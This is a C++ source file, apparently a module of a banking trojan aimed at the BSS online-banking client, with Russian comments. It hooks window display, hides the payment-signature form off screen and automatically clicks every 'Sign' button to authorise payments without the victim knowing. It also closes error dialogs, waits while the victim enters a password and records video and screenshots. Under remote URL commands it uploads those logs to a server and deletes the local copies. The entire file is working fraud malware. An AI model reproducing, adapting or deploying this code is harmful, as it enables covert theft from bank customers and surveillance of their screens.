

#include "bsssign.h"
#include "Memory.h"
#include "GetApi.h"
#include "Splice.h"
#include "Strings.h"
#include "Utils.h"
#include "Unhook.h"
#include "WndUtils.h"
#include "ScreenShots.h"
#include "Loader.h"
#include "VideoRecorder.h"
#include "UniversalKeyLogger.h"
#include "BotClasses.h"


#include "BotDebug.h"

namespace bsssign_Template
{
    #include "DbgTemplates.h"
}
#define BDBG  bsssign_Template::DBGOutMessage<>



//-------------------------------------------------
//  Объявление имени включит логирование действий
//  при установке пописи
//-------------------------------------------------
#define LOG_BSS_SIGN


//----------------------------------------------------------------------------

// Определяем переменную включающую опцию прятания окна
#if !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
	#define BSSSIGN_HIDE_WND
#endif


// Хэш имени класса формы подписывания
#define BSS_FORM_CLASS_HASH 0xF8047238 /* obj_Form */

// Хэш имени класса окна
#define BSS_BUTTON_CLASS_HASH 0xB84059EC /* obj_BUTTON */

// Хэш заголовка установки подписи
#define BSS_SIGN_FORM_CAPTION_HASH 0x4DFAF875 /* Подпись */

// Заголовок кнопки подписи
#define BSS_SIGN_BUTTON_CAPTION_HASH 0xBE1A55FD /* Подписать */

// Заголовко кнопки закрытия
#define BSS_CLOSE_BUTTON_CAPTION_HASH 0xAE1E1985 /* Закрыть */




//***********************************************************************
//  Внутренние методы BSSSign
//***********************************************************************
namespace BSSSign
{
	char BSSSignName[] = {'B','S','S','S','i','g','n', 0};
	//----------------------------------------------------
}


//***********************************************************************



//=============================================================================
#ifdef LOG_BSS_SIGN

	class TBSSSignLog;

	//  Класс логирования действий при подписи бсс
	TBSSSignLog *Logger = NULL;



	DWORD WINAPI BSSSignSendLog(LPVOID aPath)
	{
		// Функция отправляет лог
		string *Path = (string*)aPath;

		//Отправляем логи
		VideoProcess::SendFiles( 0, "bss", Path->t_str() );

		// Удаляем файлы
		DeleteFolders(Path->t_str());


		delete Path;
		return 0;
    }


	class TBSSSignLog : public TBotObject
	{
	private:
		// Поток записи лога
		string FWorkPath;
		TBotFileStream *FStream;
		int FScreensCount;
		//---------------------------------------------------------------------

		void AddScreen(LPVOID Buf, DWORD Size)
		{
			FScreensCount++;
			string Name;
			Name.Format("screen%d.png", FScreensCount);
			string FileName = FWorkPath + Name;

			File::WriteBufferA(FileName.t_str(), Buf, Size);
			Name.Format("===> <Screen%d>", FScreensCount);
            Write(NULL, false, Name.t_str());
		}
		//---------------------------------------------------------------------

		void MakeFullScreenShot()
		{
			// Функция делает снимок всего экрана
			LPBYTE Buf = NULL;
			DWORD Size = 0;
			ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, Buf, Size);
            AddScreen(Buf, Size);
			MemFree(Buf);
		}
		//---------------------------------------------------------------------

		void MakeWndScreenShot(HWND Wnd)
		{
			// Функция делает снимок всего экрана
//			LPBYTE Buf = NULL;
//			DWORD Size = 0;
//			ScreenShot::DrawWindow(Wnd, Buf, Size);
//            AddScreen(Buf, Size);
//			MemFree(Buf);

			// На данном этапе делаем тектовый "снимок"
//			PCHAR S = GetAllWindowsText(Wnd, true, true);
//			if (S)
//			{
//				Write(NULL, false, "\r\n\r\nТекстовый снимок: \r\n");
//				Write(NULL, false, S);
//				Write(NULL, false, "\r\n");
//
//				STR::Free(S);
//            }

		}
		//---------------------------------------------------------------------

	public:

		TBSSSignLog()
		{
			// Создаём файл лога
			FScreensCount = 0;

            TMemory Buf(MAX_PATH);

			pGetTempPathA(MAX_PATH, Buf.Buf());

			FWorkPath = Buf.AsStr();
			FWorkPath += "sign\\";

			pCreateDirectoryA(FWorkPath.t_str(), NULL);

			string FileName = FWorkPath + "bss.log";
			FStream = new TBotFileStream(FileName.t_str(), fcmCreate);

			// Записываем уид
			string Line = "UID: ";
			Line += GenerateBotID2();

            Write(NULL, false, Line.t_str());
		}
		//----------------------------------------------------------------

		~TBSSSignLog()
		{
			//  При уничтожении объекта закрываем лог
        	Close();
		}

		//----------------------------------------------------------------
		void Write(HWND ScreenWnd, bool MakeFullScreen, const char *Line)
		{
			// Функция записывает строку в лог
			if (!FStream) return;

			FStream->WriteString(Line);
			FStream->WriteString("\r\n");

			if (MakeFullScreen)
				MakeFullScreenShot();

			if (ScreenWnd)
				MakeWndScreenShot(ScreenWnd);
		}
		//------------------------------------------------------------------

		void AddTextFile(const char* LogLine, const char* Data, DWORD DataLen)
		{
			// Функция добавляет в лог текстовый файл
			if (!DataLen)
				DataLen = STRA::Length(Data);
			if (!DataLen) return;

			// Содаём имя файла
			FScreensCount++;
			string Name;
			Name.Format("TextLog%d.txt", FScreensCount);
			string FileName = FWorkPath + Name;

			File::WriteBufferA(FileName.t_str(), (LPVOID)Data, DataLen);
			Name.Format("---> <TextLog%d> [%s]", FScreensCount, LogLine);
			Write(NULL, false, Name.t_str());
        }


		//------------------------------------------------------------------
		void Close()
		{
			if (FStream)
			{
				delete FStream;
				FStream = NULL;

				// Отправляем лог на сервер
				StartThread(BSSSignSendLog, new string(FWorkPath));
            }
        }
	};

#endif
//=============================================================================


// Шаблон записи лога

template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE>
inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message)
{
	#ifdef LOG_BSS_SIGN
		if (Logger)
			Logger->Write((HWND)ScreenWnd, (bool)MakeScreen, (PCHAR)Message);
	#endif
}


template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE, class ARG1>
inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message, ARG1 Arg1)
{
	#ifdef LOG_BSS_SIGN
		if (Logger)
		{
			string S;
			S.Format((PCHAR)Message, Arg1);
			Logger->Write((HWND)ScreenWnd, (bool)MakeScreen, S.t_str());
        }
	#endif
}

template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE, class ARG1, class ARG2>
inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message, ARG1 Arg1, ARG2 Arg2)
{
	#ifdef LOG_BSS_SIGN
		if (Logger)
		{
			string S;
			S.Format((PCHAR)Message, Arg1, Arg2);
			Logger->Write((HWND)ScreenWnd, (bool)MakeScreen, S.t_str());
        }
	#endif
}

#define BSSSIGNLOG BSSSignLogTemplate<>




//----------------------------------------------------------------------------
HWND BSSSearchButtons(HWND Form, bool OneButton, DWORD BtnCaptionHash, TBotList* Buttons)
{
	HWND Result = NULL;
	HWND Button = NULL;
	do
	{
		Button = (HWND)pFindWindowExA(Form, Button, NULL, NULL);
		if (Button == NULL) break;

		DWORD Hash = GetWndText2(Button).Hash();

		// Проверяем заголовок кнопки
		if (Hash != BtnCaptionHash)
		{
			Result = BSSSearchButtons(Button, OneButton, BtnCaptionHash, Buttons);
		}
		else
		{
			Result = Button;
			if (Buttons)
				Buttons->Add(Button);
		}

		if (Result && OneButton)
			break;
	}
	while (true);

    return Result;
}
//----------------------------------------------------------------------------

bool BSSClickToButton(HWND Button)
{
	// Функция кликает по указанному окну
	DWORD X = Random::Generate(2, 30);
	DWORD Y = Random::Generate(2, 10);

	BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, GetWndText2(Button).t_str());
	BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);

	bool Result = HardClickToWindow(Button, X, Y);
	if (Result)
	{
		BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());

		pSleep(Random::Generate(1000, 1500));
	}

    return Result;
}
//----------------------------------------------------------------------------

DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
{
	// Перебираем дочерние окна определённого класса и заголовка
	DWORD Count = 0;
	HWND Button = NULL;
	do
	{
//		Button = (HWND)pFindWindowExA(Form, Button, BSSSign::ButtonClassName, NULL);

		Button = (HWND)pFindWindowExA(Form, Button, NULL, NULL);
		if (Button == NULL) break;

		string Text = GetWndText2(Button);
		DWORD Hash = Text.Hash();

		// Проверяем заголовок кнопки
		if (Hash != BtnCaptionHash)
		{
			Count += BSSClickToButtons(Button, MultiClick, BtnCaptionHash);
			if (Count && !MultiClick)
				return Count;
			continue;
		}

		// Кликаем по кнопке
		DWORD X = Random::Generate(2, 30);
		DWORD Y = Random::Generate(2, 10);

		BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
		BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);

		if (HardClickToWindow(Button, X, Y))
		{
			BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());

			Count++;
			pSleep(Random::Generate(1000, 1500));

			if (!MultiClick) break;
        }
	}
	while (true);

	return Count;
}



enum TBSSFormType   {bfSign, bfPassword, bfError};
enum TBSSFormStatus {bfsUnknown, bfsClicked, bfsWait, bfsReady};


class TBSSClicker;


//***********************************************
//  TBSSForm - Окно системы BSS
//***********************************************
class TBSSForm : public TBotCollectionItem
{
protected:
	HWND FForm;
	TBSSFormStatus FStatus;
	DWORD FClickTime;
	DWORD FMaxWaitInterval;

	// Функция перемещает окно
	void Move(int x, int y)
	{
		RECT R;
		if (!pGetWindowRect(FForm, &R)) return;

		int W = R.right - R.left;
		int H = R.bottom - R.top;
		pMoveWindow(FForm, x, y, W, H, FALSE);
	}

	// Кликаем по необходимым кнопкам формы
	bool virtual Click()
	{
		FClickTime = (DWORD)pGetTickCount();
		FStatus = bfsClicked;
		return true;
	}

	// Функция проверяет видимость окна
	void virtual Wait()
	{
		DWORD Interval = (DWORD)pGetTickCount() - FClickTime;
		if (Interval > FMaxWaitInterval || !(BOOL)pIsWindowVisible(FForm))
            FStatus = bfsReady;
    }

public:
	// Конструктор
	TBSSForm(TBSSClicker* aOwner, HWND Wnd)
		: TBotCollectionItem((TBotCollection*)aOwner)
	{
		FForm = Wnd;
		FStatus = bfsUnknown;
		FMaxWaitInterval = 10000; // Максимум 10 секунд ожидания закрытия
	}
    //------------------------------------------------------------------------

	// Выполнить действия с окном
	TBSSFormStatus virtual Execute()
	{
		switch (FStatus) {
			case bfsUnknown: Click(); break;            // Кликаем по кнопкам
			case bfsClicked: FStatus = bfsWait; break;  // Переходим в режим ожидания
			case bfsWait:    Wait(); break;             // Ожидаем закрытия окна
		}

		return FStatus;
	}
	//------------------------------------------------------------------------

	bool IsValid()
	{
		// Функция возвращает истину если окно валидно и отображается
		return (BOOL)pIsWindow(FForm) != FALSE;
    }
};

//***********************************************
// Окно установки подписей
//***********************************************
class TBSSSignForm : public TBSSForm
{
protected:
	bool     FCloseBtnClicked;
	int      FClickedCount;
	int      FWindowsCount;
	bool     FWaitWindow;
	TBotList FButtons;
	DWORD    FClosebtnClickStart;

	// Кликаем по кнопкам установки подписи
	bool Click()
	{
//		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
		if (FWaitWindow)
		{
			// Объект находится в режиме ожидания закрытия окна
			FWaitWindow = Owner()->Count() > FWindowsCount;
			if (FWaitWindow) return false;
        }
		// Сохраняем количество открытых окон
		FWindowsCount = Owner()->Count();

		while (FButtons.Count())
		{
			HWND Wnd = (HWND)FButtons.GetItem(0);
			FButtons.Delete(0);

			if (BSSClickToButton(Wnd))
			{
				FClickedCount++;

				if (Owner()->Count() > FWindowsCount)
				{
					// после нажатия на кнопку было отображено
					// ещё одно окно, переходим в режим ожидания закрытия
					FWaitWindow = true;
					return false;
                }
			}
        }



		BDBG("bsssign","Подпись завершена. Нажато кнопок %d", FClickedCount);

		TBSSForm::Click();


        /* TODO :
			Запускаем бесконечную запись видео.
			Данная запись должна запускаться только в случае успешной подписи
			Проблема в том, что из бота определить, что полпись успешно
			поставлена
		*/
        if (FClickedCount)
			VideoProcess::RecordPID( 0, "BSS" );

		//---------------------------------------------

        return FClickedCount > 0;
    }

	// Функция проверяет статус окна установки подписей
	void Wait()
	{
		if (Owner()->Count() > 1)
			return;
        TBSSForm::Wait();
	}

public:
	TBSSSignForm(TBSSClicker* aOwner, HWND Wnd)
		: TBSSForm(aOwner, Wnd)
	{
		// Определяем списко кнопок по которым необходимо кликнуть
		FClickedCount = 0;
		FWaitWindow   = false;
		FClosebtnClickStart = 0;
        BSSSearchButtons(Wnd, false, BSS_SIGN_BUTTON_CAPTION_HASH, &FButtons);

		BDBG("bsssign","Перехвачено окно установки подписей. Подписей %d", FButtons.Count());
		BSSSIGNLOG(Wnd, false, "Обрабатываем окно установки подписей. Подписей %d", FButtons.Count());
		#ifdef BSSSIGN_HIDE_WND
            Move(-1000, 0);
		#endif
	};


	TBSSFormStatus Execute()
	{
		// В случае если окно подписи одно на экране и на
		// нём не нажималась кнопка закрыть кликаем по ней
		if (FStatus == bfsWait && !FCloseBtnClicked)
		{

			if (Owner()->Count() == 1 && (BOOL)pIsWindowVisible(FForm))
			{
				//FCloseBtnClicked = true;
				if (!FClosebtnClickStart)
					FClosebtnClickStart = (DWORD)pGetTickCount();
				bool SendCloseMsg = ((DWORD)pGetTickCount() - FClosebtnClickStart) > 5000;

				// Будем кликать по кнопке закрытия до коликов в ж....
				// Если колики наступили а коно ещё открыто то отправляем
				// ему сообщение WM_CLOSE

				if (SendCloseMsg)
				{
                	pPostMessageA(FForm, WM_CLOSE, (WPARAM)0, (LPARAM)0);
				}
				else
				{
					BSSSIGNLOG(FForm, false, "Кликаем по кнопке закрытия");
					BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
				}
			}

			return bfsWait;
		}

		return TBSSForm::Execute();
    }

	// Функция вернёт истину если окно является окном установки подписи
	bool static IsSignForm(DWORD ClassHash, DWORD TextHash)
	{
		return ClassHash == BSS_FORM_CLASS_HASH &&
		       TextHash  == BSS_SIGN_FORM_CAPTION_HASH;
	}
};

//***********************************************
//Кдасс ожидания ввода пароля
//***********************************************
class TBSSPasswordForm : public TBSSForm
{
public:
	TBSSPasswordForm(TBSSClicker* aOwner, HWND Wnd)
		: TBSSForm(aOwner, Wnd)
	{
		// Для окно ввода пароля будем просто ожидать ввода
		BDBG("bsssign","Перехвачено окно ввода пароля");
		BSSSIGNLOG(Wnd, false, "Окно ввода пароля");
    	FMaxWaitInterval = 30 * 60 * 1000;
	}

    // Проверяем является ли окно окном ввода пароля
	bool static IsPasswordForm(TBSSClicker* Clicker, HWND WND, const string& Text)
	{
		// Этап первый: Окно должно быть диалогом, не иметь родителя.
		if (((TBotCollection*)Clicker)->Count() == 0)
			return false;

		// Этап второй: проверяем вхождение слова пароль
		// Нет данных как точно звучит заголовок окна
		return Text.Pos("Пароль") >= 0;

		/* TODO :
		При получении дополнительных данных об окне ввода пароля
		организовать нормальную фильтрацию окон. */
    }
};


//***********************************************
// Кдасс кликания по окну вывода сообщения
// об ошибке
//***********************************************
class TBSSErrorForm : public TBSSForm
{
protected:
	DWORD FTextHash;
	DWORD FClassHash;

	bool Click()
	{
		// Кликаем по кнопке Ok
		bool Clicked = BSSClickToButtons(FForm, false, FTextHash) > 0;
		TBSSForm::Click();
		return Clicked;
	}

public:
	TBSSErrorForm(TBSSClicker* aOwner, HWND Wnd)
		: TBSSForm(aOwner, Wnd)
	{
		BDBG("bsssign","Перехвачено окно ошибки");
		BSSSIGNLOG(NULL, false, "Окно ошибки");

		#ifdef BSSSIGN_HIDE_WND
            Move(-1000, 0);
		#endif

		FTextHash = 0x27EB /* Ok */;
		//FTextHash = 0x18B5 /* ОК */; // Для тестов
		FClassHash = 0;
	};

	// Функция возвращает истину если это окно ошибки
	bool static IsErrorForm(TBSSClicker* Clicker, DWORD ClassHash, DWORD TextHash)
	{
		//return  TextHash  == 0x72E78B17 /* Ошибка */;

		return  ((TBotCollection*)Clicker)->Count() > 0 &&
				ClassHash == BSS_FORM_CLASS_HASH &&
				TextHash  == 0x72E78B17 /* Ошибка */;
    }

};


//****************************************************************************
//  Класс кликания по кнопкам формы
//****************************************************************************

class TBSSClicker : public TBotCollection
{
private:
	bool FActive;
	bool FRunning;

	friend DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker);


	void CheckForm()
	{
		// Функция проверяет валидность окон
		TLock Locker = GetLocker();

		for (int i = Count() - 1; i >= 0; i--)
		{
			TBSSForm* Form = (TBSSForm*)Items(i);
			if (!Form->IsValid())
				delete Form;
        }
	}
	//-------------------------------------------------------------------

	// Функция кликает по окнам системы BSS
	void Execute()
	{
		// Выполняем цикл пока в коллекции есть окна
		pSleep(500);

		do
		{
			CheckForm();

			for (int i = 0; i < Count();)
			{
				TBSSForm* Form = (TBSSForm*)Items(i);
				TBSSFormStatus Status = Form->Execute();
				if (Status == bfsReady)
					delete Form;
				else
                    i++;
			}

			pSleep(500);


			// Проверяем необходимость завершения
			TLock L = GetLocker();
			FRunning = Count() > 0 && FActive;
			if (!FRunning) break;
		}
		while (true);
	}
    //------------------------------------------------------------------------


public:
	//  Constructor
	TBSSClicker()
		: TBotCollection()
	{
		FActive = false;
		FRunning = false;
		SetThreadSafe();
	};
	//------------------------------------------------------------------------

	void SetActive(bool Value)
	{
		BDBG("bsssign","Активация системы BSS кликера. Активно=%d", Value);
        FActive = Value;
	}
	//------------------------------------------------------------------------

	bool IsDialog(HWND Wnd)
	{
		// Функция возвращает истину если окно является диалоговым окном

		HWND Owner = (HWND)pGetWindow(Wnd, GW_OWNER);

		// Наличие окна владельца предполагает, что окно является диалоговым
        return Owner != NULL;
	}
	//------------------------------------------------------------------------

    // Добавляем форму для клика
	bool AddForm(HWND WND)
	{
		if (!FActive || !IsDialog(WND))
			return false;

		string Text      = GetWndText2(WND);
		string Class     = GetWndClassName2(WND);
		DWORD  TextHash  = Text.Hash();
		DWORD  ClassHash = Class.Hash();

		TBSSForm* Form = NULL;

		BDBG("bsssign","Обрабатываем окно: \r\n  Class: %s \r\n  Text: %s", Class.t_str(), Text.t_str());

        // Проверяем окно установки подписей
		if (TBSSSignForm::IsSignForm(ClassHash, TextHash))
			Form = new TBSSSignForm(this, WND);
		else
		// Проверяем окно ввода пароля
		if (TBSSPasswordForm::IsPasswordForm(this, WND, Text))
			Form = new TBSSPasswordForm(this, WND);
		else
		// Проврям окно ошибок
		if (TBSSErrorForm::IsErrorForm(this, ClassHash, TextHash))
			Form = new TBSSErrorForm(this, WND);

		// Логируем информацию об окне
		#ifdef LOG_BSS_SIGN
			if (Logger && !Text.IsEmpty())
			{
				// Получаем надписи всех окон
				PCHAR WndText = GetAllWindowsText(WND, true, true);
				if (WndText)
				{
					Logger->Write(NULL, false, "Отображается окно: ");
                    Logger->AddTextFile(Text.t_str(), WndText, 0);
					STR::Free(WndText);
                }
			}
		#endif


		if (!Form) return false;

        BSSSIGNLOG(NULL, false, "Обрабатываем форму [%s]", Text.t_str());


		// Запускаем поток
		TLock L = GetLocker();
		if (!FRunning)
		{
			FRunning = true;
			StartThread(BSSClickerThreadMethod, this);
		}

		return true;
	}
	//-------------------------------------------------------------------------
};



DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker)
{
    ((TBSSClicker*)Clicker)->Execute();
    return 0;
}





namespace BSSSign
{

    TBSSClicker* Clicker = NULL; // Система кликания ко кнопкам BSS

	bool RecordVideo = false;
	RECT WindowRect;


	// Хук отображения окна
	void WINAPI Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data);

	// Функция подписывает платёж
	DWORD WINAPI SignPayment(LPVOID Data);

}



//----------------------------------------------------------------------------
void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
{
    // Обрабатываем отображение окон
	PShowWindowData WndData = (PShowWindowData)Data;
	int Cmd = WndData->Command;
	HWND Wnd = WndData->Window;

	if (Cmd == SW_SHOW || Cmd == SW_SHOWNORMAL)
		Clicker->AddForm(Wnd);
}
//----------------------------------------------------------------------------

void BSSSign::CheckRequest(PCHAR URL)
{
	//  Функция проверяет запрос на предмет
	//  адрес запроса на предмет наличия в нём
	//  команды управления

	if (STR::IsEmpty(URL))
		return;


	if ( CompareUrl( "*az_start", URL ) )
	{
		#ifdef LOG_BSS_SIGN
			// Создаём объект логирования
			if (!Logger)
            	Logger = new TBSSSignLog;
		#endif


		Clicker->SetActive(true);

		// Если с данного процесса не запущена запись видео
		// то принудительно стартуем её
		//RecordVideo = !VideoRecorderSrv::PingClient(0);
		//if (RecordVideo)
			RecordVideo = VideoProcess::RecordPID( 0, BSSSignName );

        BSSSIGNLOG(NULL, true, "Получена команда СТАРТ");
	}
	else
	if ( CompareUrl( "*az_stop", URL ) )
	{
		BSSSIGNLOG(NULL, true, "Получена команда СТОП");

		Clicker->SetActive(false);
		if (RecordVideo)
		{
			RecordVideo = false;
			VideoProcess::RecordStop();
		}

		#ifdef LOG_BSS_SIGN
			// Уничтожаем объект логирования
			delete Logger;
			Logger = NULL;
		#endif
	}
//	else
//	if ( CompareUrl( "*blind_up", URL ) )
//	{
//
//		BDBG("bsssign","Blind=true; тоесть хайдим главное окно ие");
//		Blind = true;
//	}
//	else
//	if ( CompareUrl( "*blind_down", URL ) )
//	{
//		BDBG("bsssign","Возвращаем видимость окна");
//		pEnumWindows((WNDENUMPROC)EnumWindowsIE, NULL);
//
//		Blind = false;
//	}
//	else
//	if ((CompareUrl( "*move_up", URL)) && (!Move))
//	{
//
//		BDBG("bsssign","окно ие в право");
//		HWND Wind = (HWND)pFindWindowA("IEFrame", NULL);
//		pGetWindowRect(Wind,&WindowRect);
//		int x =(int)pGetSystemMetrics( SM_CXSCREEN );
//		int y =(int)pGetSystemMetrics( SM_CYSCREEN );
//
//		BDBG("bsssign","окно ие в право %d",x);
//		BDBG("bsssign","окно ие в право %d",y);
//		pMoveWindow(Wind,x,0,WindowRect.right-WindowRect.left,WindowRect.bottom-WindowRect.top,FALSE);
//
//		Move=true;
//	}
//	else
//	if (( CompareUrl( "*move_down", URL ) )&&(Move))
//	{
//		BDBG("bsssign","Окно ие на место");
//		HWND Wind = (HWND)pFindWindowA("IEFrame",NULL);
//		pMoveWindow(Wind,WindowRect.left ,WindowRect.top ,WindowRect.right-WindowRect.left,WindowRect.bottom - WindowRect.top,TRUE);
//
//		Move = false;
//	}
}

//-----------------------------------------------------------------------------

void BSSSign::Initialize()
{
	// Функция инициализирует систему подписи BSS
	BDBG("bsssign","Инициализируем BSS кликер");

	Clicker = new TBSSClicker();

	#ifdef LOG_BSS_SIGN
		Logger = NULL;
	#endif

	RecordVideo = false;

	bool Connected = KeyLogger::ConnectEventHandler(KLE_SHOW_WND, Event_ShowWindow);
	if (Connected)
    	BDBG("bsssign","Событие подключено");
}




